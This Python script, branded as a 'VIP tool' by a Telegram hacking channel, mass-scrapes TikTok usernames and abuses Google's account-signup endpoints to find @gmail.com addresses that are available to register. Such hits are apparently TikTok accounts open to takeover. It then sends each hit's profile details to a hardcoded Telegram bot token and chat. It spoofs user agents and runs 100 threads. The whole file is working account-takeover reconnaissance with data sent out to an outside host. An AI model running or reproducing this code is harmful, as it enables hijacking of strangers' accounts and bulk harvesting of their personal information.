import os
try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_tiktok=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'

logo='''▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[1;36m

────░░░───────────────────────────░░░───
─░░░─────────░▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▓▓─────░───
░░──────▒█████████████▓▓▓▓▓▒▓▓██▓────░──
░────▒███▓▒▒░──░▒▒░──░░░░░░░────██────░─
░───██░───░░▒░░░░───░─░░▒▒▓▓▒░───██───░░
───▓█───▒░───▒░────▒───────▒▒▒░──░█────░
───█▒─────────░──────▓████▒───────██────
──██────██████─────██▓▓█████▓─░────██───
─██▒░───▓███████──░████▓█▓▒█▒─▓▓▓█▒─██▓─
▓█─░▓██▓──────█─────▒───▒█▓░▒███▓░██──█▒
██──▒░▒███▒──██───────────▒▒▒──▒█──██─░█
░█─░──█────██▓─────▓██▒─────▒██▒██▒▓█──█
─██░─██░───██▓───██▓░█──▒████───█░─█░─██
──█──████▓───▒██───░████▓░─██▒███────██─
──█▓─█▓█░███████████▒░█──▒███▒██────██──
──█▓─███░█▓──█▒─░█───▒███████▓█────██───
──██─███████████████████───░██────▓█────
──██─██████████████▒───█──██▓────░█░───░
──█▓─░██▓█─█─▒█───█────████─────██▒───░░
──█▒──▒██████▒█▒▒███████▒──░▒▓███─────░─
──█░──────▒▒██████▒▒░░──░▒░▓███▒──────░─
──█──▒─▒▒──────────░▒▒░──▓██░────░░────░
──█──░▒▒▒▒▒░░─░─░─░───░███████▒───░────░
──██─────────────░▒▒▓███████████──░░───░
───██▓░──────▒▓████▓░──█████████▒──░────
──░──█████████████───▒▓██████████──░░───
──░──██████████████▒▓████████████░──░───
──░──▓███████████▓───░███████████▓──░───
──░───███████████─────████████████──░───
───░───██████████░▒███████████████──░───
───░░───▓███████████████████▒─▓██───░───
───░▒───█████████████████████──────░░───
──░░───██████████████████████───░░░─────
─░░───████████████████████████──░▒─────░
─░───█████████████████████████───▒─────░
░───██████████████████████████▓───░░────
░──▓███████████████████████████░───░░───
──░█████████████████████████████▓───░░──
░──▓██████████████████████████████────░─
░────▓█████████████████████████████░───░
▒────███████████████████████████████▒──░
───▒█████████████████████████████████───
──▒███████████████████████████████████──
─░████████████████████████████████████──
─█████████████░─────────░█████████████░─
─███████████░─────────────████████████──
─▓██████████───░░░░░░▒▒───▒███████████──
──██████████──░░────░░───░███████████▒──
──██████████──░─────░───█████████████───
───█████████──░░───░───█████████████───░
░──█████████───░───░───███████████▒───░░
░──▒████████░──░───░──██████████▒────░░─
░───████████▓──░───░──███▓████▒────░░───
░░──████████───░───░───██░─▓─────░░░────
─░──▒███▒─█▓──░░───░░───▒███───░░───────
─░░───░█░─▓█──░░────░░───███──░░──────░░
──░────█▓███──░──────░░───░───░────░░░──
──░░──█▒─██───░────────░─────░░───░░────
──░──░████───░░─────────░░░░░─────░─────
──░░──▒░────░░────▒░─────────────░──────

	      
	        <THOMAS VİP TOOL >
              TELEGRAM : @T5OMAS / @THOMASHACK
	
\033[1;97m ▬▬▬▬▬▬▬▬▬\
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''     

import requests,faker,user_agent,random
from user_agent import generate_user_agent
from faker import Faker
import os
try:
    import requests,colorama,prettytable,webbrowser
except:
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system("pip install prettytable")
    os.system("pip install webbrowser")
    os.system('pip install python-cfonts')
    os.system('pip install Faker')
    os.system('pip install AegosPy ')
    os.system('pip install threading ')
    os.system('pip install GetInfoInsta')
    os.system("clear")	
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' 
Q = '\033[1;36m'
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m' 
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
e=0
import os,random,sys,time
os.system("pkg install espeak")
os.system("clear")
from os import system as _HERON_
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.01)
            sys.stdout.flush()
lo(" \x1b[1;36m     Api İle Bağlantı Kuruluyor ...")
os.system('clear')            
from cfonts import render            
output = render('THOMAS', colors=['white', 'blue'], align='center')
print(output)
print("~ Programmer : @T5OMAS | Channel: @THOMASHACK ~")
print("\x1b[1;39m—" * 60)


token ="6917609210:AAF2hyO3W_3FHbk2aP8ByVLsTrei6RoU9bo"
print("\x1b[1;39m—" * 60)
ID ="-1002029496923"
print("\x1b[1;39m—" * 60)
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')
def info(email):
  global hits
  email=str(email)
  user = email.split('@')[0]
  try:
    headers = {
      'Host': 'www.woodrowpoe.top',
      'Connection': 'keep-alive',
      # 'Content-Length': '13',
      'package': 'woodrowpoe.tik.realfans',
      'apptype': 'android',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.124 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'idfa': '6160fb46-9862-4d44-95b9-b1911283231f',
      'Accept': 'application/json, text/plain, */*',
      'version': '1.1',
      'Origin': 'http://www.woodrowpoe.top',
      'X-Requested-With': 'woodrowpoe.tik.realfans',
      'Referer': 'http://www.woodrowpoe.top/h5_v5/',
      # 'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
      # 'Cookie': 's61336ece=pobodmoenf5fja9p6h01oinph8',
    }

    data = {
      'username': user,
    }

    response = requests.post('http://www.woodrowpoe.top/api/v1/tikTokGetUserProfileInfo', headers=headers, data=data).json()
    id = response['data']['pk']
    user = user
    name = response['data']['nickname']
    folon = response['data']['followingCount']
    folos = response['data']['followerCount']
    lik =  response['data']['heartCount']
    vid = response['data']['videoCount']
    priv = response['data']['isPraise']
    ff = (f'''
  𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝑇𝐼𝐾𝑇𝑂𝐾 𓊇 𒋨────━𓆩𝐓𝐇𝐎𝐌𝐀𝐒𓆪‏━────𒋨
 🇹🇷 𝖎𝖘𝖎𝖒 : {name}
 🇹🇷 𝕶𝖚𝖑𝖑𝖆𝖓ı𝖈ı 𝖆𝖉𝖎 :  {user}
 🇹🇷 𝕲𝖒𝖆𝖎𝖑 : {email}
 🇹🇷 𝕿𝖆𝖐𝖎𝖕𝖈𝖎 : {folos}
 🇹🇷 𝕿𝖆𝖐𝖎𝖕 : {folon}
 🇹🇷 𝕭𝖊𝖌𝖊𝖓𝖎 : {lik}
 🇹🇷 𝖎𝖉 : {id}
 🇹🇷 𝖌𝖎𝖟𝖑𝖎 : {priv}
 🇹🇷 𝖁𝖎𝖉𝖊𝖔 : {vid}
𒋨────━𓆩𝐓𝐇𝐎𝐌𝐀𝐒𓆪‏━────𒋨
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌;  @T5OMAS @THOMASHACK
 
   ''')
    requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+ID+'&text='+ff)
  except:
    ff=f'''
𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝑇𝐼𝐾𝑇𝑂𝐾 𓊇    𒋨────━𓆩𝐓𝐇𝐎𝐌𝐀𝐒𓆪‏━────𒋨
    🇹🇷 𝕶𝖚𝖑𝖑𝖆𝖓ı𝖈ı 𝖆𝖉𝖎 :  {user}
 🇹🇷 𝕲𝖒𝖆𝖎𝖑 : {email}
𒋨────━𓆩𝐓𝐇𝐎𝐌𝐀𝐒𓆪‏━────𒋨
    '''
    requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+ID+'&text='+ff)
  hits+=1
def Qredes(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(email)
    else:bads_email+=1
  except:''
    
def check(email):
  global bads_tiktok,hits,bads_email
  try:
    os.system('clear' if os.name == 'posix' else 'cls')
    print(logo)
    tt=(f"\r{GREEN}Hit:{GREEN} {hits} {RED} kötü tiktok:{RED} {bads_tiktok} {YELLOW} Orta mail :{YELLOW} {bads_email}")
    print(tt)
    api=choice(['https://aptik-1db9c6c31665.herokuapp.com/zaid/?email=','https://ktok-71c59a8d8835.herokuapp.com/zaid/?email='])
    h_h=requests.get(api+email).json()['Result']
    if h_h == True:
      Qredes(email)
    else:
      bads_tiktok+=1
  except:bads_tiktok+=1
   # check(email)
  os.system('clear' if os.name == 'posix' else 'cls')
  print(logo)
  tt=(f"\r{GREEN}Hit :{GREEN} {hits} {RED} Kötü tiktok:{RED} {bads_tiktok} {YELLOW} orta mail :{YELLOW} {bads_email}")
  print(tt)



from random import choice,randrange
from requests import get
from threading import Thread
def tiktok_search():
  while True:
    try:
      g=choice(['دجحخهعغفقثصضشسيبلاتنمكطظزوةىلارؤءئ','azertyuiopmlkjhgfdsqwxcvbn1234567890','アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン','あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん'])
      keyword=''.join((choice(g) for i in range(randrange(3,15))))
      api=choice(['https://search-tiktok-1-171abbbf8702.herokuapp.com/','https://search-tiktok-2-c9711a07f632.herokuapp.com/'])
      api=get(api+'Qredes/keyword='+keyword).json()['user_list']
      for user in api:
        username=user['user_info']['unique_id']
        secUid=user['user_info']['sec_uid']
        if '_' not in username:
          check(username+'@gmail.com')
        params = {
            "count": "200",
            "minCursor": "0",
            "scene": "67",
            "secUid": secUid}
        try:
          req=get('https://www.tiktok.com/api/user/list/?',params=params).json()['userList']
        except:'Qredes'
        try:
          for i in req:
            username=i['user']['uniqueId']
            if '_' not in username:
              check(username+'@gmail.com')
        except:'Qredes'
    except:'Qredes'
for i in range(100):
  Thread(target=tiktok_search).start()

# by @Qredes / @t5omas